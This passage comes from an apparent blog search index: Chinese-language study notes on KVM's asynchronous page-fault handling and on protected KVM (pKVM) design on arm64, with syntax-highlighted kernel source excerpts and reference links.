class=\"line\">\tdown_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (npages == -EHWPOISON ||</span><br><span class=\"line\">\t      (!async &amp;&amp; check_user_page_hwpoison(addr))) &#123;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_HWPOISON;</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> <span class=\"built_in\">exit</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">retry:</span><br><span class=\"line\">\tvma = find_vma_intersection(current-&gt;mm, addr, addr + <span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (vma == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (vma-&gt;vm_flags &amp; (VM_IO | VM_PFNMAP)) &#123;</span><br><span class=\"line\">\t\tr = hva_to_pfn_remapped(vma, addr, async, write_fault, writable, &amp;pfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r == -EAGAIN)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> retry;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (async &amp;&amp; vma_is_valid(vma, write_fault))</span><br><span class=\"line\">\t\t\t*async = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\tpfn = KVM_PFN_ERR_FAULT;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"><span class=\"built_in\">exit</span>:</span><br><span class=\"line\">\tup_read(&amp;current-&gt;mm-&gt;mmap_sem);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> pfn;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"http://books.gigatux.nl/mirror/kerneldevelopment/0672327201/ch14lev1sec2.html\">Memory Areas (gigatux.nl)</a><code>VM_IO</code>表示</p>\n<blockquote>\n<p>The area maps a device’s I&#x2F;O space</p>\n</blockquote>\n<p>这里async传入指针，有两个作用</p>\n<ol>\n<li>指针空或非空表示是否支持async，指导内层函数</li>\n<li>如果指针非空，true&#x2F;false表示是否需要async(例如swap0，指导外层函数)</li>\n</ol>\n<p><code>hva_to_pfn_slow</code>-&gt;<code>get_user_page_nowait</code>-&gt;<code>get_user_pages</code>-&gt;<code>__get_user_pages</code> -&gt;<code>faultin_page</code>-&gt;<code>handle_mm_fault</code>-&gt;<code>__handle_mm_fault</code>-&gt;<code>handle_pte_fault</code>-&gt;<code>do_swap_page</code></p>\n<p>这里是同步处理swap</p>\n<p>下面是异步处理swap</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span> <span class=\"title function_\">try_async_pf</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">bool</span> prefault, <span class=\"type\">gfn_t</span> gfn,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">gpa_t</span> cr2_or_gpa, <span class=\"type\">kvm_pfn_t</span> *pfn, <span class=\"type\">bool</span> write,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t <span class=\"type\">bool</span> *writable)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!prefault &amp;&amp; kvm_can_do_async_pf(vcpu)) &#123;</span><br><span class=\"line\">\t\ttrace_kvm_try_async_get_page(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_find_async_pf_gfn(vcpu, gfn)) &#123;</span><br><span class=\"line\">\t\t\ttrace_kvm_async_pf_doublefault(cr2_or_gpa, gfn);</span><br><span class=\"line\">\t\t\tkvm_make_request(KVM_REQ_APF_HALT, vcpu);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (kvm_arch_setup_async_pf(vcpu, cr2_or_gpa, gfn))</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t*pfn = __gfn_to_pfn_memslot(slot, gfn, <span class=\"literal\">false</span>, <span class=\"literal\">NULL</span>, write, writable);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//include/linux/kvm_host.h</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">void</span> <span class=\"title function_\">kvm_make_request</span><span class=\"params\">(<span class=\"type\">int</span> req, <span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsmp_wmb();</span><br><span class=\"line\">\tset_bit(req &amp; KVM_REQUEST_MASK, &amp;vcpu-&gt;requests);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果vm支持async，直接返回，不处理；否则再调用一次<code>gfn_to_pfn</code>并不支持async强制同步swap</p>\n<p>kvm_make_request对当前vcpu有作用，例如挂起</p>\n<p><a href=\"https://www.kernel.org/doc/html/v4.15/virtual/kvm/vcpu-requests.html\">KVM VCPU Requests — The Linux Kernel documentation</a></p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">tdp_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> gpa, u32 error_code,<span class=\"type\">bool</span> prefault)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (try_async_pf(vcpu, prefault, gfn, gpa, &amp;pfn, write, &amp;map_writable))</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> RET_PF_RETRY;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_mmu_page_fault</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"type\">gpa_t</span> cr2_or_gpa, u64 error_code,</span></span><br><span class=\"line\"><span class=\"params\">\t\t       <span class=\"type\">void</span> *insn, <span class=\"type\">int</span> insn_len)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tr = vcpu-&gt;arch.mmu.page_fault(vcpu, cr2_or_gpa,</span><br><span class=\"line\">\t\t\t\t\t       lower_32_bits(error_code),<span class=\"literal\">false</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r == RET_PF_RETRY)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (r &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">handle_ept_violation</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">gpa_t</span> gpa=vmcs_read64(GUEST_PHYSICAL_ADDRESS);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> kvm_mmu_page_fault(vcpu, gpa, error_code, <span class=\"literal\">NULL</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vmx_handle_exit</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (exit_reason &lt; kvm_vmx_max_exit_handlers</span><br><span class=\"line\">\t    &amp;&amp; kvm_vmx_exit_handlers[exit_reason])</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> kvm_vmx_exit_handlers[exit_reason](vcpu);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_enter_guest</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (kvm_request_pending(vcpu)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (kvm_check_request(KVM_REQ_APF_HALT, vcpu)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">/* Page is swapped out. Do synthetic halt */</span></span><br><span class=\"line\">            vcpu-&gt;arch.apf.halted = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            r = <span class=\"number\">1</span>;</span><br><span class=\"line\">            <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">   \t\t...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    r = kvm_mmu_reload(vcpu);</span><br><span class=\"line\">    kvm_x86_ops-&gt;run(vcpu);</span><br><span class=\"line\">    r = kvm_x86_ops-&gt;handle_exit(vcpu);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span class=\"title function_\">vcpu_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">kvm</span> *<span class=\"title\">kvm</span> =</span> vcpu-&gt;kvm;</span><br><span class=\"line\">\tvcpu-&gt;srcu_idx = srcu_read_lock(&amp;kvm-&gt;srcu);</span><br><span class=\"line\">\tvcpu-&gt;arch.l1tf_flush_l1d = <span class=\"literal\">true</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (;;) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (kvm_vcpu_running(vcpu)) &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_enter_guest(vcpu);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\tr = vcpu_block(kvm, vcpu);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (r &lt;= <span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsrcu_read_unlock(&amp;kvm-&gt;srcu, vcpu-&gt;srcu_idx);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">kvm_arch_vcpu_ioctl_run</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_vcpu *vcpu, <span class=\"keyword\">struct</span> kvm_run *kvm_run)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> r;</span><br><span class=\"line\">\t...</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (kvm_run-&gt;immediate_exit)</span><br><span class=\"line\">\t\tr = -EINTR;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span></span><br><span class=\"line\">\t\tr = vcpu_run(vcpu);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//virt/kvm/kvm_main.c</span></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">long</span> <span class=\"title function_\">kvm_vcpu_ioctl</span><span class=\"params\">(<span class=\"keyword\">struct</span> file *filp,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t   <span class=\"type\">unsigned</span> <span class=\"type\">int</span> ioctl, <span class=\"type\">unsigned</span> <span class=\"type\">long</span> arg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (ioctl) &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">case</span> KVM_RUN: &#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pid</span> *<span class=\"title\">oldpid</span>;</span></span><br><span class=\"line\">\t\tr = -EINVAL;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (arg)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\t\toldpid = rcu_access_pointer(vcpu-&gt;pid);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (unlikely(oldpid != current-&gt;pids[PIDTYPE_PID].pid)) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">/* The thread running this VCPU changed. */</span></span><br><span class=\"line\">\t\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pid</span> *<span class=\"title\">newpid</span> =</span> get_task_pid(current, PIDTYPE_PID);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\trcu_assign_pointer(vcpu-&gt;pid, newpid);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (oldpid)</span><br><span class=\"line\">\t\t\t\tsynchronize_rcu();</span><br><span class=\"line\">\t\t\tput_pid(oldpid);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tr = kvm_arch_vcpu_ioctl_run(vcpu, vcpu-&gt;run);</span><br><span class=\"line\">\t\ttrace_kvm_userspace_exit(vcpu-&gt;run-&gt;exit_reason, r);</span><br><span class=\"line\">\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">file_operations</span> <span class=\"title\">kvm_vcpu_fops</span> =</span> &#123;</span><br><span class=\"line\">\t.release        = kvm_vcpu_release,</span><br><span class=\"line\">\t.unlocked_ioctl = kvm_vcpu_ioctl,</span><br><span class=\"line\">\t.mmap           = kvm_vcpu_mmap,</span><br><span class=\"line\">\t.llseek\t\t= noop_llseek,</span><br><span class=\"line\">&#125;;  </span><br></pre></td></tr></table></figure>\n\n<p>之后这个错误就一路返回到用户态了，然后挂起vcpu。等待内核管理内存的线程swap in</p>\n","categories":["virtualization"]},{"title":"PKVM","url":"/2025/02/04/virtualization/PKVM/","content":"<h1 id=\"PKVM\"><a href=\"#PKVM\" class=\"headerlink\" title=\"PKVM\"></a>PKVM</h1><p>与传统的机密虚拟机区别的是 传统机密虚拟机用硬件加密保护内存 因此如果host恶意破坏 达到的只是DOS的目的</p>\n<p>这并不在传统的机密虚拟机的威胁模型内</p>\n<p>对于pkvm不利用硬件的机密虚拟机 必须保证页表完全在可信的EL2内完成</p>\n<p><a href=\"https://mirrors.edge.kernel.org/pub/linux/kernel/people/will/slides/kvmforum-2020-edited.pdf\">https://mirrors.edge.kernel.org/pub/linux/kernel/people/will/slides/kvmforum-2020-edited.pdf</a></p>\n<p><a href=\"https://kvm-forum.qemu.org/2022/KVM%20forum%202022%20-%20pKVM%20deep%20dive.pdf\">https://kvm-forum.qemu.org/2022/KVM%20forum%202022%20-%20pKVM%20deep%20dive.pdf</a></p>\n<p><a href=\"https://qemu-project.gitlab.io/kvm-forum/2022/NYSM-NYD-KVM-2022.pdf\">https://qemu-project.gitlab.io/kvm-forum/2022/NYSM-NYD-KVM-2022.pdf</a></p>\n<p><a href=\"https://lwn.net/Articles/836693/\">https://lwn.net/Articles/836693/</a></p>\n<blockquote>\n<p>When a new guest is created, its memory will be unmapped from the host, which is not something that Linux can deal with.</p>\n</blockquote>\n<p><a href=\"https://lwn.net/Articles/835342/\">https://lwn.net/Articles/835342/</a></p>\n<h2 id=\"设计\"><a href=\"#设计\" class=\"headerlink\" title=\"设计\"></a>设计</h2><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=NjlkYmNmOWZlZjk4MmYyMTU4YWIxYTkzMzQyMTcyNWNfWkt1TkpaaERZNURteFA1R2FhcFBpRnU0MzlOUXJDb1NfVG9rZW46TTByYmJSenhpb2JYUUp4YWlZcWNGa2drbnhjXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA\" alt=\"img\"></p>\n<ul>\n<li>Extend world-switch code at EL2 to manage stage-2 page-tables and guest state ***</li>\n<li>Install a stage-2 translation for the host kernel during boot before loading vendor modules *****</li>\n<li>Message passing between host and VM ****</li>\n<li>Template bootloader which accepts only signed VM images *</li>\n<li>Formal verification techniques to reason about EL2 code *</li>\n</ul>\n<p>EL2可能会有的限制</p>\n<ul>\n<li>Not preemptible&#x2F;interruptible and unable to block&#x2F;schedule</li>\n<li>Can access all of normal memory if mapped</li>\n<li>Very limited device access; typically no console</li>\n<li>Basically just context-switches EL1 and allows host kernel to run functions with elevated privilege</li>\n<li>Tight coupling with host kernel</li>\n</ul>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcxMWU3MjQ3NjRmODE0MTM0MWE4ZDgzZjNjZDVjMmZfbGZQbldPb0VRcjJndU9Nc2Q4cXJZanF1MHd1VElLRk9fVG9rZW46R2MzcGJWTTFUb1JER0N4NFo1b2NEc1Q5blZiXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA\" alt=\"img\"></p>\n<p>关于页表必须在EL2操作</p>\n<blockquote>\n<p>lifting the page-table code to run directly at EL2 on a non-VHE system (as we plan to to do in future</p>\n<p>patches) is practically impossible due to the number of dependencies it has on the core kernel.</p>\n</blockquote>\n<p><a href=\"https://lore.kernel.org/all/20200911132529.19844-1-will@kernel.org/T/#u\">https://lore.kernel.org/all/20200911132529.19844-1-will@kernel.org/T/#u</a></p>\n<p>percpu有什么问题 之后再看</p>\n<p>保护磁盘文件</p>\n<p><a href=\"https://www.kernel.org/doc/html/latest/filesystems/fsverity.html\">https://www.kernel.org/doc/html/latest/filesystems/fsverity.html</a></p>\n<blockquote>\n<p>A standard file hash could be used instead of fs-verity. However, this is inefficient if the file is large and only a small portion may be accessed. </p>\n</blockquote>\n<p>实际上大模型和推理框架的二进制文件只用两个hash就可以</p>\n<p>VIRTIO_F_ACCESS_PLATFORM swiotlb&#x3D;force </p>\n<blockquote>\n<p>Expose SHARE&#x2F;UNSHARE hypercalls to the guest to update host stage-2.</p>\n<p>Hook the set_memory_{decrypted,encrypted}() API to share&#x2F;unshare bounce buffer</p>\n<p>pages</p>\n</blockquote>\n<p>SEV只需要改一个pte的bit即可加密 但是pkvm需要用hypercall 这边后续看看能否找到hook的代码 找不到手动加一下也不麻烦 参考这个</p>\n<p><a href=\"https://android-kvm.googlesource.com/linux/+/314641360847d8c84ceb913a4510521963eb6442%5E%21/#F5\">https://android-kvm.googlesource.com/linux/+/314641360847d8c84ceb913a4510521963eb6442%5E%21/#F5</a></p>\n<p><a href=\"https://android-kvm.googlesource.com/linux/+/e7cf427f7b55583dd5be3752313765dd6fa4e4a1\">https://android-kvm.googlesource.com/linux/+/e7cf427f7b55583dd5be3752313765dd6fa4e4a1</a></p>\n<p><strong>pkvm-android-mainline-6.6 有这个代码</strong></p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><p><a href=\"https://www.cl.cam.ac.uk/~pes20/Stuff/pkvm/notes37-2020-11-25-pkvm-code-overview.html#setup---stage-2-wrapping-the-host\">https://www.cl.cam.ac.uk/~pes20/Stuff/pkvm/notes37-2020-11-25-pkvm-code-overview.html#setup---stage-2-wrapping-the-host</a></p>\n<p><a href=\"https://android-kvm.googlesource.com/linux/\">https://android-kvm.googlesource.com/linux/</a></p>\n<p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDVkZGVkMmEwNjE2YzI1ZDBmNTcxYjFlZTEwMGEzNWJfa2FaS3FMWmpNRm9IdmFTRXpNbW55emhCUTNVWHB2VmdfVG9rZW46R2t6VmJaVTFpb0YwcmR4WFY2d2Nzalo5bjZlXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA\" alt=\"img\"></p>\n<h3 id=\"内存操作\"><a href=\"#内存操作\" class=\"headerlink\" title=\"内存操作\"></a>内存操作</h3><p><img src=\"https://h7dbgreydj.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWFiYThkODQ5YjY2NTQ0NWI2NmZkZDFkMDc5NjY2MDJfbUVkUEU2ZGVTSzBqYlV6bDA2SlJFektPdmk2bG9pUk1fVG9rZW46VzdWZGI1b2dubzNCcUZ4ZFNIRGNHbmNpblhiXzE3Mzg2NzMzNjg6MTczODY3Njk2OF9WNA\" alt=\"img\"></p>\n<p>这个属性通过pkvm_getstate(kvm_pgtable_hyp_pte_prot(ctx-&gt;old));</p>\n<p>放到pte中 用SW1和SW2保留位（bit55）</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">enum</span> <span class=\"title class_\">pkvm_page_state</span> &#123;</span><br><span class=\"line\">    PKVM_PAGE_OWNED         = <span class=\"number\">0ULL</span>,</span><br><span class=\"line\">    PKVM_PAGE_SHARED_OWNED      = KVM_PGTABLE_PROT_SW0,</span><br><span class=\"line\">    PKVM_PAGE_SHARED_BORROWED   = KVM_PGTABLE_PROT_SW1,</span><br><span class=\"line\">    __PKVM_PAGE_RESERVED        = KVM_PGTABLE_PROT_SW0 |</span><br><span class=\"line\">                      KVM_PGTABLE_PROT_SW1,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* Meta-states which aren&#x27;t encoded directly in the PTE&#x27;s SW bits */</span></span><br><span class=\"line\">    PKVM_NOPAGE,</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"kvm页表\"><a href=\"#kvm页表\" class=\"headerlink\" title=\"kvm页表\"></a>kvm页表</h4><figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">kvm_pgtable_walk</span><span class=\"params\">(<span class=\"keyword\">struct</span> kvm_pgtable *pgt, u64 addr, u64 size,</span></span></span><br><span class=\"line\"><span class=\"params\"><span class=\"function\">                     <span class=\"keyword\">struct</span> kvm_pgtable_walker *walker)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_pgtable_walk_data</span> walk_data = &#123;</span><br><span class=\"line\">                .start        = <span class=\"built_in\">ALIGN_DOWN</span>(addr, PAGE_SIZE),</span><br><span class=\"line\">                .addr        = <span class=\"built_in\">ALIGN_DOWN</span>(addr, PAGE_SIZE),</span><br><span class=\"line\">                .end        = <span class=\"built_in\">PAGE_ALIGN</span>(walk_data.addr + size),</span><br><span class=\"line\">                .walker        = walker,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">int</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">        r = <span class=\"built_in\">kvm_pgtable_walk_begin</span>(walker);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (r)</span><br><span class=\"line\">                <span class=\"keyword\">return</span> r;</span><br><span class=\"line\"></span><br><span class=\"line\">        r = _kvm_pgtable_walk(pgt, &amp;walk_data);</span><br><span class=\"line\">        <span class=\"built_in\">kvm_pgtable_walk_end</span>(walker);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"keyword\">inline</span> <span class=\"type\">int</span> __kvm_pgtable_visit(<span class=\"keyword\">struct</span> kvm_pgtable_walk_data *data,</span><br><span class=\"line\">                                      <span class=\"keyword\">struct</span> kvm_pgtable_mm_ops *mm_ops,</span><br><span class=\"line\">                                      <span class=\"type\">kvm_pteref_t</span> pteref, s8 level)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        <span class=\"keyword\">enum</span> <span class=\"title class_\">kvm_pgtable_walk_flags</span> flags = data-&gt;walker-&gt;flags;</span><br><span class=\"line\">        <span class=\"type\">kvm_pte_t</span> *ptep = <span class=\"built_in\">kvm_dereference_pteref</span>(data-&gt;walker, pteref);</span><br><span class=\"line\">        <span class=\"keyword\">struct</span> <span class=\"title class_\">kvm_pgtable_visit_ctx</span> ctx = &#123;</span><br><span class=\"line\">                .ptep        = ptep,</span><br><span class=\"line\">                .old        = <span class=\"built_in\">READ_ONCE</span>(*ptep),</span><br><span class=\"line\">                .arg        = data-&gt;walker-&gt;arg,</span><br><span class=\"line\">                .mm_ops        = mm_ops,</span><br><span class=\"line\">                .start        = data-&gt;start,</span><br><span class=\"line\">                .addr        = data-&gt;addr,</span><br><span class=\"line\">                .end        = data-&gt;end,</span><br><span class=\"line\">                .level        = level,</span><br><span class=\"line\">                .flags        = flags,</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">int</span> ret = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">bool</span> reload = <span class=\"literal\">false</span>;</span><br><span class=\"line\">        <span class=\"type\">kvm_pteref_t</span> childp;</span><br><span class=\"line\">        <span class=\"type\">bool</span> table = <span class=\"built_in\">kvm_pte_table</span>(ctx.old, level);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (table &amp;&amp; (ctx.flags &amp; KVM_PGTABLE_WALK_TABLE_PRE)) &#123;</span><br><span class=\"line\">                ret = <span class=\"built_in\">kvm_pgtable_visitor_cb</span>(data, &amp;ctx, KVM_PGTABLE_WALK_TABLE_PRE);</span><br><span class=\"line\">                reload = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!table &amp;&amp; (ctx.flags &amp; KVM_PGTABLE_WALK_LEAF)) &#123;</span><br><span class=\"line\">                ret = <span class=\"built_in\">kvm_pgtable_visitor_cb</span>(data, &amp;ctx, KVM_PGTABLE_WALK_LEAF);</span><br><span class=\"line\">                reload = <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">         * Reload the page table after invoking the walker callback for leaf</span></span><br><span class=\"line\"><span class=\"comment\">         * entries or after pre-order traversal, to allow the walker to descend</span></span><br><span class=\"line\"><span class=\"comment\">         * into a newly installed or replaced table.</span></span><br><span class=\"line\"><span class=\"comment\">         */</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (reload) &#123;</span><br><span class=\"line\">                ctx.old = <span class=\"built_in\">READ_ONCE</span>(*ptep);</span><br><span class=\"line\">                table = <span class=\"built_in\">kvm_pte_table</span>(ctx.old, level);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_pgtable_walk_continue</span>(data-&gt;walker, ret))</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!table) &#123;</span><br><span class=\"line\">                data-&gt;addr = <span class=\"built_in\">ALIGN_DOWN</span>(data-&gt;addr, <span class=\"built_in\">kvm_granule_size</span>(level));</span><br><span class=\"line\">                data-&gt;addr += <span class=\"built_in\">kvm_granule_size</span>(level);</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        childp = (<span class=\"type\">kvm_pteref_t</span>)<span class=\"built_in\">kvm_pte_follow</span>(ctx.old, mm_ops);</span><br><span class=\"line\">        ret = __kvm_pgtable_walk(data, mm_ops, childp, level + <span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!<span class=\"built_in\">kvm_pgtable_walk_continue</span>(data-&gt;walker, ret))</span><br><span class=\"line\">                <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (ctx.flags &amp; KVM_PGTABLE_WALK_TABLE_POST)</span><br><span class=\"line\">                ret = <span class=\"built_in\">kvm_pgtable_visitor_cb</span>(data, &amp;ctx, KVM_PGTABLE_WALK_TABLE_POST);</span><br><span class=\"line\"></span><br><span class=\"line\">out:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"built_in\">kvm_pgtable_walk_continue</span>(data-&gt;walker, ret))</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">static</span> <span class=\"type\">int</span> <span 